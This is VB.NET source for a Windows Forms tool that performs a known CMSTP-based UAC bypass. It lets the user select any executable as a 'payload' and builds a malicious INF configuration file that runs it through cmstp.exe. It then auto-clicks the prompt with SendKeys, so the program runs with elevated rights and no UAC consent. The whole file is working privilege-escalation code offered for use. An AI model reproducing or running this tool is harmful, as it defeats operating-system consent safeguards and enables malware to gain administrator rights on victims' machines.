﻿Imports System.IO, System.Threading

Public Class Form1
    Private exe_path, err_msg As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        txtDebug.Text = "Active @ " & DateTime.Now.ToString("HH:mm:ss") & " on " & DateTime.Now.ToString("MM/dd/yyyy") & " " & TimeZoneInfo.Local.ToString
    End Sub

    Private Sub btnSelect_Click(sender As Object, e As EventArgs) Handles btnSelect.Click
        Dim _ofd As New OpenFileDialog

        _ofd.Filter = "Executable Files (*.exe)|*.exe"
        _ofd.InitialDirectory = Path.GetFullPath(Environment.SpecialFolder.Desktop)

        ' select .exe file to execute w/o uac prompt
        If _ofd.ShowDialog = DialogResult.OK Then

            Dim filename As String = Path.GetFileName(_ofd.FileName)

            txtPath.Text = _ofd.FileName

            exe_path = _ofd.FileName

            txtDebug.Text = txtDebug.Text & vbNewLine & "Payload " & Chr(34) & filename & Chr(34) & " selected for bypass."

        End If
    End Sub

    Private Sub btnBypass_Click(sender As Object, e As EventArgs) Handles btnBypass.Click
        If Not String.IsNullOrEmpty(txtPath.Text) Then
            ' build config script + execute payload
            bypass()
        Else
            MessageBox.Show("You must select an executable file!", "U dun goofed!")
        End If
    End Sub

    Private Function bypass()
        CheckForIllegalCrossThreadCalls = False

        ' generate service name / this can really be anything you want
        Dim svc_name = genJunk(15, 35)

        ' setup path for cmspt configuration filename
        Dim conf As String = My.Computer.FileSystem.SpecialDirectories.Temp & "\config.inf"

        ' configuration file content
        Dim conf_content As String = "[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
 
[RunPreSetupCommandsSection]
" & Chr(34) & exe_path & Chr(34) & "
taskkill /IM cmstp.exe /F
 
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
 
[AllUSer_LDIDSection]
" & Chr(34) & "HKLM" & Chr(34) & ", " & Chr(34) & "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE" & Chr(34) & ", " & Chr(34) & "ProfileInstallPath" & Chr(34) & ", " & Chr(34) & "%UnexpectedError%" & Chr(34) & ", " & Chr(34) & Chr(34) & "
 
[Strings]
ServiceName=" & Chr(34) & svc_name & Chr(34) & "
ShortSvcName=" & Chr(34) & svc_name & Chr(34)

        If My.Computer.FileSystem.FileExists(conf) Then
            Try
                File.Delete(conf)
            Catch : End Try
        End If

        Try
            txtDebug.Text = txtDebug.Text & vbNewLine & "CMSTP configuation file generated @ " & DateTime.Now.ToString("HH:mm:ss")

            ' build configuration file
            File.WriteAllText(conf, conf_content)

            ' setup command to load configuration file into cmstp service
            Dim command As String = "cmd.exe /C C:\Windows\System32\cmstp.exe " & Chr(34) & conf & Chr(34) & " /au"

            ' execute
            Shell(command)

            ' wait for cmspt prompt to show
            Thread.Sleep(500)

            ' auto-click "OK" for the user
            SendKeys.Send("{ENTER}")

            txtDebug.Text = txtDebug.Text & vbNewLine & "Payload executed @ " & DateTime.Now.ToString("HH:mm:ss")
            ' <success.png>

            ' show some love <3
            Process.Start("https://github.com/waived")

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Function

    Public Function genJunk(MinLength As Integer, MaxLength As Integer) As String
        'Static rnd As New Random()
        Dim rnd As New Random()
        Dim validchars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim res As String = ""
        For i As Integer = 0 To rnd.Next(MinLength - 1, MaxLength)
            res += validchars(rnd.Next(0, validchars.Length))
        Next
        Return res
    End Function
End Class
